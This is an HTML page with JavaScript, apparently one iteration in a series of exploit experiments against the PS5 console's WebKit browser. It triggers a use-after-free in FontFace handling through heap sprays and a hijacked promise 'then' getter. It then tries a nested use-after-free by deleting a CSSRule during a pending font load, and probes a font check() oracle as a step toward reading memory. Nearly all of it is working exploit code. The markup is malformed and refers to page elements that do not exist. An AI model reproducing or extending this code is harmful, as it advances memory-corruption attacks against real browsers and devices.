<!DOCTYPE html>
<html>
<head>

<title>PS5 v27 - Nested UAF</title>
<style id="s">

<body>
<div id="hd">

<script>
"use strict";

// ============================================================
//  PS5 v27 — Nested UAF
//
//  STRATEGY:
//  Use the CSSRule primitive to create a NEW CSSFontFace,
//  then FREE it during load() → second UAF!
//
//  The difference: this CSSFontFace was created via CSSOM
//  (not FontFace JS API). It might use a different allocation
//  path or IsoHeap bucket.
//
//  PLAN:
//  1. Standard UAF + CSSRule for "x" (proven)
//  2. Start load("64px x", "B") — async
//  3. While load is pending, delete the CSSRule
//  4. Spray objects to reclaim the freed CSSFontFace
//  5. When load resolves, check what we got
//  6. If we got a different object type = TYPE CONFUSION!
// ============================================================

var O=document.getElementById("out");
var bar=document.getElementById("bar");
function pg(p){bar.style.width=p+"%"}
function hu(id,v){var e=document.getElementById(id);if(e)e.innerHTML=v}
function P(m,c){var s=document.createElement("span");if(c)s.className=c;
s.textContent=m+"\n";O.appendChild(s);O.scrollTop=O.scrollHeight;
try{console.log("[v27] "+m)}catch(e){}}
function Ok(m){P("  ✅ "+m,"ok")}function Fl(m){P("  ✘ "+m,"er")}
function Hi(m){P("  ► "+m,"hl")}function St(m){P("  ★ "+m+" ★","mg")}
function Dm(m){P("  "+m,"dm")}function Wr(m){P("  ⚠ "+m,"wr")}
function Hd(m){P("▸ "+m,"hd")}function Sep(){P("─".repeat(42),"dm")}

window.onerror=function(m,s,l){Fl("FATAL: "+m.substring(0,60)+" @"+l);return true};

var keep=[],holes=[],rcs=[];
var trigger=null,rcFace=null,rcIdx=-1,uafOk=false;
var xRuleIdx=-1,xRule=null;
var ctx=document.getElementById("cv").getContext("2d");

var FB="d09GMgABAAAAAAJkAA4AAAAABiAAAAIQAAEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAP0ZGVE0cGhwGYACCQggEEQgKcH0LCgABNgIkAxAEIAWEEAcyGy4FAI7Ctnlz5COJZMsihmWKh4f78Z573/0ZGIXRWLVZpRVNBz5LGmglcIJtH2hFs/L71vRPNg6FnRed2yOwAbJMJfRVCkhVAas6QCnP5701PYAm8AF8l8DegK66cR6mEGHAUS8K8ALFQCjz1m9GpK46tojEaUMI+PLzugVw1L1+g6Pdp10QoNuwKBKBQJW4q4V8mJ9xBx80vlmJDlJLBwDtADhxIz/D0Ya1YYmV/6ZePgIBgAmEBg1GEFgjBEZETYBSgpurYWj/ch78CyBaCUAkEgAQmj1O5W3E/1CCAu1o0I1+AIV5ERBV1dXSU+diLZ3nRV9OPep/9GPyZ/Ej398zrQyAl2Rh7bat/DBuWlu+rt026YeBG7HEWiTBtcafwuPKhODd1XFhmFr73R4rx+1LpKGZyEdolyDIR7hSoJlAAIAqpoBC8R6B0i5BIgS2SAC9niEApAChzzQCqc0uAo0ZFwhQ+vxCgBb9MYlAq744BSGqAxgjjBFIvVbQOKeKMuYfLSaEK7Yai2XguKmauX0HCg5t2NC0aubAChy/qmzUaj+jIBwDp8wtufXYHvxEVgIHtm05wG+yZ2mOGSQNC3Asy+sbTAq/FwbN6yCuJCftLedsSI0DzknNJsNUfOUqnng/9Fzes281/5JpNDqJaw3DWypomi41n5fDXAgJ/L/HCghqKARzIbLt1taqkzUt";
var FBb=(function(){var s=atob(FB),b=new Uint8Array(s.length);
for(var i=0;i<s.length;i++)b[i]=s.charCodeAt(i);return b})();
function mkBuf(){var c=new Uint8Array(FBb.length);c.set(FBb);return c.buffer}
function fs(){try{void document.body.offsetTop}catch(e){}}

// UAF Setup
for(var i=0;i<4096;i++){try{var f=new FontFace("h_"+i,mkBuf(),{
unicodeRange:"U+E1"+(i%16).toString(16),style:i%2===0?"normal":"italic",
weight:String(100+(i%9)*100)});document.fonts.add(f);holes.push(f)}catch(e){}}
fs();for(var i=1;i<holes.length;i+=2)try{document.fonts.delete(holes[i])}catch(e){}
fs();
trigger=new FontFace("trigger","local(Helvetica)",{unicodeRange:"U+0041"});
document.fonts.add(trigger);void trigger.loaded;
var sh=document.getElementById("s").sheet;
for(var i=0;i<48;i++)try{sh.insertRule("@font-face{font-family:pad"+i+";src:url(np"+i+".woff);unicode-range:U+E000}",sh.cssRules.length)}catch(e){}
fs();
var fst=document.createElement("style");fst.id="flush";document.head.appendChild(fst);
var fsh=fst.sheet;
for(var i=0;i<768;i++)try{fsh.insertRule("@font-face{font-family:fl"+i+";src:url(nf"+i+".woff);unicode-range:U+E000}",fsh.cssRules.length)}catch(e){}
fs();

Object.defineProperty(FontFace.prototype,"then",{configurable:true,
get:function(){if(this===trigger&&!uafOk){uafOk=true;hu("h2","UAF:<b>✅</b>");
try{var ck=new FontFace("ck","local(Helvetica)",{unicodeRange:"U+E124"});
document.fonts.add(ck);keep.push(ck);sh.deleteRule(1);fs();
while(fsh.cssRules.length)try{fsh.deleteRule(0)}catch(e){}
fs();for(var i=0;i<holes.length;i+=4)try{document.fonts.delete(holes[i])}catch(e){}
fs()}catch(e){}
for(var i=0;i<4096;i++){try{var f=new FontFace("RC_"+i,mkBuf(),{
unicodeRange:"U+0041",style:"italic",weight:"900",display:"block"});
document.fonts.add(f);rcs.push(f)}catch(e){}}
fs();try{var d=document.createElement("div");d.textContent="AB";
d.style.cssText="position:absolute;left:-9999px;font:64px trigger;";
document.body.appendChild(d);void d.offsetWidth}catch(e){}
}return undefined}});

var rn=0;var raf=function(){rn++;
if(!uafOk&&rn>=5){try{if(sh&&sh.cssRules.length>1){sh.deleteRule(1);fs()}
while(fsh.cssRules.length)try{fsh.deleteRule(0)}catch(e){}
for(var i=0;i<4096;i++){try{var f=new FontFace("RC_"+i,mkBuf(),{
unicodeRange:"U+0041",style:"italic",weight:"900"});
document.fonts.add(f);rcs.push(f)}catch(e){}}fs()}catch(e){}}
if(rn<20)requestAnimationFrame(raf)};requestAnimationFrame(raf);

// ============================================================
//  Capture
// ============================================================
document.fonts.load("1em trigger, x","AB").then(function(faces){
for(var i=0;i<faces.length;i++){
var f=faces[i];
if(f.family&&f.family.indexOf("RC_")===0){rcFace=f;var m=f.family.match(/RC_(\d+)/);if(m)rcIdx=parseInt(m[1])}
}
keep.push(faces);keep.push(rcFace);
if(!rcFace){Fl("No RC");return}
Ok("RC_"+rcIdx+" captured");
hu("h3","RC:<b>"+rcIdx+"</b>");
var ua=navigator.userAgent||"";var m=ua.match(/PlayStation\s*5\/?\s*([0-9]+(?:\.[0-9]+)?)/i);
hu("h1","FW:<b>"+(m?m[1]:"?")+"</b>");

// Add CSSRule for "x"
xRuleIdx=sh.insertRule(
"@font-face{font-family:x;src:local(Courier);font-weight:400;font-style:normal;unicode-range:U+0042}",
sh.cssRules.length);
fs();
xRule=sh.cssRules[xRuleIdx];
Ok("CSSRule for 'x' ready");

// ============================================================
//  PHASE 1: Nested UAF — Delete CSSRule during load
// ============================================================
pg(15);Sep();Hd("PHASE 1: Nested UAF via CSSRule");Sep();

P("  Strategy: Start load('64px x','B'), then delete CSSRule","dm");
P("");

// Step 1: Start load (async)
P("  Step 1: Starting load('64px x', 'B')...","dm");
var loadPromise = document.fonts.load("64px x", "B");

// Step 2: Immediately delete the CSSRule (FREE the CSSFontFace)
P("  Step 2: Deleting CSSRule during pending load...","dm");
try {
sh.deleteRule(xRuleIdx);
fs();
Ok("CSSRule deleted during load");
} catch(e) {
Fl("Delete: " + e.message);
}

// Step 3: Spray to reclaim the freed CSSFontFace
P("  Step 3: Spraying to reclaim freed CSSFontFace...","dm");

// Spray FontFace objects (same IsoHeap type)
var nestedSpray = [];
for (var i = 0; i < 2048; i++) {
try {
var f = new FontFace("NEST_" + i, mkBuf(), {
unicodeRange: "U+0042",
style: i % 2 === 0 ? "normal" : "italic",
weight: String([100, 300, 500, 700, 900][i % 5]),
display: ["auto", "block", "swap", "fallback"][i % 4]
});
document.fonts.add(f);
nestedSpray.push(f);
} catch(e) {}
}
fs();
Ok("Sprayed " + nestedSpray.length + " NEST faces");

// GC pressure
for (var i = 0; i < 4; i++) {
var tmp = [];
for (var j = 0; j < 256; j++) tmp.push(new ArrayBuffer(4096));
}

// Step 4: Wait for load to resolve
P("  Step 4: Waiting for load to resolve...","dm");

loadPromise.then(function(faces) {
P("  Load resolved with " + faces.length + " faces","hl");
for (var i = 0; i < faces.length; i++) {
var f = faces[i];
P("    [" + i + "] family=" + f.family + " style=" + f.style +
" weight=" + f.weight + " status=" + f.status, "hl");

// Check if a NEST face appeared!
if (f.family && f.family.indexOf("NEST_") === 0) {
St("NEST FACE FOUND IN LOAD RESULT!");
Hi("  Nested UAF + reclamation CONFIRMED!");
Hi("  The freed CSSFontFace was reclaimed by " + f.family);
}
}

// Check if faces have unexpected properties
for (var i = 0; i < faces.length; i++) {
var f = faces[i];
try {
// If the CSSFontFace was freed and reclaimed,
// properties might be corrupted
var fam = f.family;
var st = f.status;
var w = f.weight;
var s = f.style;

// Look for mismatched or impossible values
if (fam === "x" && w !== "400") {
Hi("PROPERTY MISMATCH: family=x but weight=" + w);
}
if (fam === "x" && s !== "normal") {
Hi("PROPERTY MISMATCH: family=x but style=" + s);
}
if (st === "error") {
Hi("ERROR STATUS on face " + fam);
}
} catch(e) {
Hi("ACCESS ERROR on face[" + i + "]: " + e.message);
}
}

// Keep references
keep.push(faces);
keep.push(nestedSpray);

// Continue to phase 2
phase2();
}).catch(function(e) {
Fl("Load error: " + e.message);
Hi("Load REJECTED = possible UAF effect!");
phase2();
});

// ============================================================
//  PHASE 2: Multiple rapid delete+spray cycles
// ============================================================
function phase2() {
pg(30);Sep();Hd("PHASE 2: Rapid Delete+Spray Cycles");Sep();

P("  Testing rapid CSSRule add/delete cycles...","dm");
P("");

var cycleResults = [];

for (var cycle = 0; cycle < 5; cycle++) {
try {
// Add CSSRule
var idx = sh.insertRule(
"@font-face{font-family:x;src:local(Courier);font-weight:" +
(100 + cycle * 200) + ";unicode-range:U+0042}",
sh.cssRules.length);
fs();

// Start load (don't await)
var lp = document.fonts.load("64px x", "B");

// Immediately delete
sh.deleteRule(idx);
fs();

// Spray
var cycSpray = [];
for (var i = 0; i < 256; i++) {
try {
var f = new FontFace("C" + cycle + "_" + i, mkBuf(), {
unicodeRange: "U+0042",
weight: String(100 + cycle * 200)
});
document.fonts.add(f);
cycSpray.push(f);
} catch(e) {}
}
fs();

// Check result
lp.then(function(faces) {
var result = {
cycle: cycle,
faceCount: faces.length,
families: faces.map(function(f) { return f.family; }).join(",")
};
cycleResults.push(result);

P("  Cycle " + cycle + ": " + faces.length + " faces [" +
result.families.substring(0, 40) + "]",
faces.length > 0 ? "hl" : "dm");

// Check for C faces
for (var i = 0; i < faces.length; i++) {
if (faces[i].family && faces[i].family.indexOf("C" + cycle + "_") === 0) {
St("CYCLE " + cycle + " RECLAIMED: " + faces[i].family);
}
}
}).catch(function(e) {
P("  Cycle " + cycle + ": REJECTED","er");
});

keep.push(cycSpray);
} catch(e) {
P("  Cycle " + cycle + ": ERR " + e.message.substring(0,30),"er");
}
}

// Wait a bit then continue
setTimeout(phase3, 500);
}

// ============================================================
//  PHASE 3: CSSRule delete + check() oracle
//  Add rule → check=false, delete rule → check=true
// ============================================================
function phase3() {
pg(50);Sep();Hd("PHASE 3: CSSRule toggle oracle");Sep();

P("  Testing rapid CSSRule add/delete as oracle...","dm");
P("");

// Baseline: no CSSRule for "x"
var baseChk = document.fonts.check("64px x", "B");
P("  Baseline (no rule): check=" + baseChk, baseChk ? "hl" : "dm");

// Add rule
var r1 = sh.insertRule(
"@font-face{font-family:x;src:local(Courier);font-weight:400;unicode-range:U+0042}",
sh.cssRules.length);
fs();
var addChk = document.fonts.check("64px x", "B");
P("  After add rule: check=" + addChk, addChk ? "hl" : "dm");

// Delete rule
sh.deleteRule(r1);
fs();
var delChk = document.fonts.check("64px x", "B");
P("  After delete rule: check=" + delChk, delChk ? "hl" : "dm");

// Re-add
var r2 = sh.insertRule(
"@font-face{font-family:x;src:local(Courier);font-weight:400;unicode-range:U+0042}",
sh.cssRules.length);
fs();
var readdChk = document.fonts.check("64px x", "B");
P("  After re-add: check=" + readdChk, readdChk ? "hl" : "dm");

// Re-delete
sh.deleteRule(r2);
fs();
var redesChk = document.fonts.check("64px x", "B");
P("  After re-delete: check=" + redesChk, redesChk ? "hl" : "dm");

// Analysis
P("");
if (addChk !== delChk) {
Hi("CSSRule toggle changes check() behavior!");
Hi("This is a 1-bit oracle via CSSRule add/delete!");
}

// ============================================================
//  PHASE 4: Rapid toggle with property encoding
// ============================================================
pg(65);Sep();Hd("PHASE 4: Property Encoding via Toggle");Sep();

P("  Testing if we can encode data via rapid toggle...","dm");
P("");

// Encode bits: 1 = add rule (check=false), 0 = no rule (check=true)
var bits = [1, 0, 1, 1, 0, 1, 0, 0];
var decoded = [];

for (var bi = 0; bi < bits.length; bi++) {
try {
if (bits[bi] === 1) {
sh.insertRule(
"@font-face{font-family:x;src:local(Courier);font-weight:400;unicode-range:U+0042}",
sh.cssRules.length);
} else {
// Delete last rule if it's for "x"
var lastIdx = sh.cssRules.length - 1;
if (lastIdx >= 0) {
try { sh.deleteRule(lastIdx); } catch(e) {}
}
}
fs();

var chk = document.fonts.check("64px x", "B");
// check=false → bit=1 (rule present)
// check=true → bit=0 (rule absent)
var bit = chk ? 0 : 1;
decoded.push(bit);

P("  Sent " + bits[bi] + " → check=" + chk + " → bit=" + bit,
bits[bi] === bit ? "ok" : "er");
} catch(e) {
P("  Bit " + bi + ": ERR","er");
decoded.push(-1);
}
}

P("");
P("  Sent:    " + bits.join(""));
P("  Got:     " + decoded.join(""));
var match = bits.every(function(b, i) { return b === decoded[i]; });
P("  Match:   " + (match ? "YES!" : "NO"), match ? "ok" : "er");

// ============================================================
//  PHASE 5: Use toggle oracle to detect memory state
//  If we can make the oracle depend on memory content...
// ============================================================
pg(80);Sep();Hd("PHASE 5: Memory-Dependent Oracle");Sep();

P("  Testing if oracle can read memory state...","dm");
P("");

// The idea: if we spray objects between toggle operations,
// and the CSSFontSelector's HashMap entry points to freed memory,
// then adding/removing CSSRule might behave differently
// depending on what's in the freed slot

P("  Test 1: Toggle without spray","");
var results1 = [];
for (var i = 0; i < 10; i++) {
try {
var idx = sh.insertRule("@font-face{font-family:x;src:local(Courier);unicode-range:U+0042}", sh.cssRules.length);
fs();
var c1 = document.fonts.check("64px x", "B");
sh.deleteRule(idx);
fs();
var c2 = document.fonts.check("64px x", "B");
results1.push(c1 ? "1" : "0");
} catch(e) {
results1.push("E");
}
}
P("  No spray: " + results1.join(""), "dm");

P("");
P("  Test 2: Toggle with spray between each","");
var results2 = [];
for (var i = 0; i < 10; i++) {
try {
var idx = sh.insertRule("@font-face{font-family:x;src:local(Courier);unicode-range:U+0042}", sh.cssRules.length);
fs();
var c1 = document.fonts.check("64px x", "B");
sh.deleteRule(idx);
fs();

// Spray between operations
var s = [];
for (var j = 0; j < 64; j++) {
s.push(new ArrayBuffer(128));
}

var c2 = document.fonts.check("64px x", "B");
results2.push(c1 ? "1" : "0");
} catch(e) {
results2.push("E");
}
}
P("  With spray: " + results2.join(""), "dm");

P("");
if (results1.join("") !== results2.join("")) {
St("SPRAY AFFECTS ORACLE BEHAVIOR!");
Hi("Memory content influences check() results!");
} else {
P("  No difference — oracle not memory-dependent","dm");
}

// ============================================================
//  PHASE 6: Re-add CSSRule with modified properties
//  After nested UAF, try to read back
// ============================================================
pg(90);Sep();Hd("PHASE 6: Post-UAF Property Read");Sep();

P("  Re-adding CSSRule and reading properties...","dm");
P("");

// Add CSSRule with specific weight
var testWeights = ["100", "300", "500", "700", "900"];
for (var wi = 0; wi < testWeights.length; wi++) {
try {
var w = testWeights[wi];
var idx = sh.insertRule(
"@font-face{font-family:x;src:local(Courier);font-weight:" + w + ";unicode-range:U+0042}",
sh.cssRules.length);
fs();

// Read via load()
document.fonts.load("64px x", "B").then(function(faces) {
var xF = null;
for (var i = 0; i < faces.length; i++) {
if (faces[i].family === "x") { xF = faces[i]; break; }
}
if (xF) {
P("  Write " + w + " → Read " + xF.weight,
xF.weight === w ? "ok" : "hl");
if (xF.weight !== w) {
Hi("MISMATCH after nested UAF!");
}
}
});

// Clean up
sh.deleteRule(idx);
fs();
} catch(e) {
P("  Weight " + w + ": ERR","er");
}
}

// ============================================================
//  SUMMARY
// ============================================================
pg(100);Sep();Hd("FINAL SUMMARY");Sep();
P("");
P("  UAF:              ✅");
P("  RC captured:      RC_" + rcIdx);
P("  CSSRule toggle:   " + (addChk !== delChk ? "✅" : "❌"));
P("  Nested UAF:       See Phase 1-2 results");
P("  Toggle oracle:    See Phase 3-4 results");
P("  Memory-dependent: " + (results1.join("") !== results2.join("") ? "✅" : "❌"));
P("");
P("  Key questions:","hl");
P("  1. Did NEST face appear in load result?","dm");
P("  2. Does CSSRule toggle work as oracle?","dm");
P("  3. Does spray affect oracle behavior?","dm");
hu("h4","NESTED:<b>DONE</b>");

// Cleanup nested spray
for (var i = 0; i < nestedSpray.length; i++) {
try { document.fonts.delete(nestedSpray[i]); } catch(e) {}
}
}

P("");
P("════════════════════════════════════","hd");

}).catch(function(e){Fl("Load: "+e.message)});
</script>
